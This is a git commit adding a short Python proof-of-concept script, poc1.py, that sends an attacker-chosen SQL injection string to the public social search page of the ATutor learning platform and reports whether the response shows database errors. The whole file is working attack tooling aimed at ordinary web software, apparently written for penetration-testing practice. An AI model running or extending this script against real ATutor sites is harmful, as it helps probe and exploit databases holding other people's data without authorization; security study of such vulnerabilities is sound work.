84d8f55dd51c3ece02dc8d5599cc26566b47e9c1
Gary Hooks <garyhooks@gmail.com>
2023-02-26 12:48:27 +0000

    Create poc1.py

---
+++ ATutor/poc1.py
@@ -0,0 +1,34 @@
+import sys
+import re
+import requests
+import bs4
+
+def searchFriends_sqli(ip, inj_str):
+    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
+
+    r = requests.get(target)
+    s = bs4.BeautifulSoup(r.text, 'html.parser')
+    print ("Response Headers:")
+    print (r.headers)
+
+    print ("Response Content:")
+    print (s.text)
+
+    error = re.search("Invalid argument", s.text)
+    if error:
+        print ("Errors found in response. Possible SQL injection found")
+    else:
+        print ("No errors found")
+
+def main():
+
+    if len(sys.argv) != 3:
+        print ("(+) usage: %s <target> <injection_string>" % sys.argv[0])
+        print ('(+) eg: %s 192.168.1.100 "aaaa\'" ' % sys.argv[0])
+    ip = sys.argv[1]
+    injection_string = sys.argv[2]
+
+    searchFriends_sqli(ip, injection_string)
+
+if __name__ == "__main__":
+    main()
